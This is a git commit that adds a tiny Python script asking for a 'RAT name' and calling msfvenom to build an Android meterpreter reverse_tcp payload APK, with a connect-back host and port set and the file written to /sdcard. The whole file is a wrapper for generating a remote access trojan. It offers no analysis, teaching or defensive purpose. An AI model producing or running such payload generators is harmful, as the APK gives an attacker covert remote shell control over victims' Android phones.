d9cd28f763973bdc49b85ce74f8c491fae619b88
mahdiyar2009 <94992001+mahdiyar2009@users.noreply.github.com>
2021-11-24 22:14:40 +0330

    Add files via upload

---
+++ b.py
@@ -0,0 +1,8 @@
+import os
+
+
+
+
+
+name_of_RAT = input("please enter RAT name: ")
+os.system(f"cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")
